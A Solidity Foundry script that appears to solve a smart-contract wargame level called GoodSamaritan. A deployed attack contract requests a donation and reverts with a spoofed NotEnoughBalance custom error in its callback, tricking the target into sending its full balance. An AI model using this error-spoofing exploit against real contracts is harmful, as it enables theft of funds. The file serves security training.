// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../instance/Level27.sol";
import "forge-std/Script.sol";

contract ExploitLevel27 is Script {
    GoodSamaritan instance = GoodSamaritan(0xA067749E8eFA200A7c952A8cdA61a7b2C0b140AA);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackInstance attackContract = new AttackInstance();
        attackContract.attack(instance);
        vm.stopBroadcast();
    }
}

contract AttackInstance {
    error NotEnoughBalance();

    function attack(GoodSamaritan _instance) external {
        _instance.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
